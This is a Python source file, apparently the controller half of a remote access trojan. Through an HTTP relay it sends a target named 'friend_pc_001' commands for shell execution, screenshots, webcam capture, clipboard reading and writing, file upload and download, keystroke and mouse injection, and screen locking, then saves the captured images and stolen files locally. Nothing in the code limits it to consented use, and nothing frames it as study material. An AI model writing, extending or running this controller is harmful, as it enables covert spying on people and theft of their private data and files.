import requests
import json
import base64
import pprint
import sys
import time
from datetime import datetime

RELAY_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
CLIENT_ID = "controller_001"
TARGET_ID = "friend_pc_001"

def send_command(cmd):
    cmd["from"] = CLIENT_ID
    cmd["to"] = TARGET_ID
    cmd["ts"] = str(datetime.now())
    requests.post(RELAY_URL, json=cmd, timeout=5)
    print(f"[*] Sent: {cmd['type']}")

def poll_response():
    try:
        resp = requests.get(f"{RELAY_URL}/{CLIENT_ID}", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("to") == CLIENT_ID:
                return data
    except:
        pass
    return None

def main():
    print(f"[*] Connecting to relay: {RELAY_URL}")
    print(f"[*] Registered as: {CLIENT_ID}")
    print("[*] Connected. Commands:")
    print("  shell <cmd> | screenshot | webcam | sysinfo | ps | ls <path>")
    print("  get_file <path> | put_file <path> <base64> | clipboard_get")
    print("  clipboard_set <text> | type_text <text> | mouse_click [x y]")
    print("  echo <text> | panic | lock | ping | exit")
    
    while True:
        cmd = input("> ").strip()
        
        if cmd == "exit":
            break
        
        if cmd.startswith("shell "):
            send_command({"type": "shell", "cmd": cmd[6:]})
        elif cmd == "screenshot":
            send_command({"type": "screenshot"})
        elif cmd == "webcam":
            send_command({"type": "webcam"})
        elif cmd == "sysinfo":
            send_command({"type": "sysinfo"})
        elif cmd == "ps":
            send_command({"type": "ps"})
        elif cmd.startswith("ls"):
            path = cmd[3:].strip() or "."
            send_command({"type": "ls", "path": path})
        elif cmd.startswith("get_file "):
            send_command({"type": "get_file", "path": cmd[9:].strip()})
        elif cmd.startswith("clipboard_get"):
            send_command({"type": "clipboard_get"})
        elif cmd.startswith("clipboard_set "):
            send_command({"type": "clipboard_set", "data": cmd[14:].strip()})
        elif cmd.startswith("type_text "):
            send_command({"type": "type_text", "text": cmd[10:].strip()})
        elif cmd.startswith("mouse_click"):
            parts = cmd[12:].strip().split()
            if len(parts) == 2:
                send_command({"type": "mouse_click", "x": int(parts[0]), "y": int(parts[1])})
            else:
                send_command({"type": "mouse_click"})
        elif cmd.startswith("put_file "):
            parts = cmd[9:].strip().split(maxsplit=1)
            send_command({"type": "put_file", "path": parts[0], "data": parts[1] if len(parts)>1 else ""})
        elif cmd == "lock":
            send_command({"type": "lock"})
        elif cmd.startswith("echo "):
            send_command({"type": "echo", "message": cmd[5:].strip()})
        elif cmd == "panic":
            send_command({"type": "panic"})
        elif cmd == "ping":
            send_command({"type": "ping"})
        else:
            print("Unknown command.")
        
        # Poll for response
        time.sleep(2)
        for _ in range(5):
            response = poll_response()
            if response:
                if response["type"] == "result":
                    print(f"\n[RESULT]:\n{response['output']}")
                elif response["type"] == "screenshot":
                    img_data = base64.b64decode(response["data"])
                    with open("remote_screen.png", "wb") as f:
                        f.write(img_data)
                    print("[*] Screenshot saved as remote_screen.png")
                elif response["type"] == "pong":
                    print(f"[*] Pong from {response.get('hostname')}")
                elif response["type"] == "sysinfo":
                    print("\n[SYSTEM INFO]:")
                    pprint.pprint(response['data'])
                elif response["type"] == "ps":
                    print("\n[PROCESSES]:")
                    for p in response['data'][:20]:
                        print(f"  PID {p['pid']:6} {p['name'][:30]:30} CPU {p['cpu_percent']:.1f}% MEM {p['memory_percent']:.1f}%")
                elif response["type"] == "ls":
                    print(f"\n[FILES in {response['path']}]:")
                    for f in response['data']:
                        typ = "DIR" if f['is_dir'] else "FILE"
                        print(f"  [{typ}] {f['name']} ({f['size']} bytes)")
                elif response["type"] == "file_data":
                    fname = response.get("name", "downloaded_file")
                    with open(f"remote_{fname}", "wb") as f:
                        f.write(base64.b64decode(response['data']))
                    print(f"[*] File saved as remote_{fname}")
                elif response["type"] == "clipboard":
                    print(f"\n[CLIPBOARD]: {response['data'][:500]}")
                elif response["type"] == "webcam":
                    img_data = base64.b64decode(response["data"])
                    with open("remote_webcam.png", "wb") as f:
                        f.write(img_data)
                    print("[*] Webcam image saved as remote_webcam.png")
                elif response["type"] == "echo":
                    print(f"\n[ECHO]: {response['message']}")
                elif response["type"] == "error":
                    print(f"[!] Error: {response['message']}")
                break
            time.sleep(1)

if __name__ == "__main__":
    main()
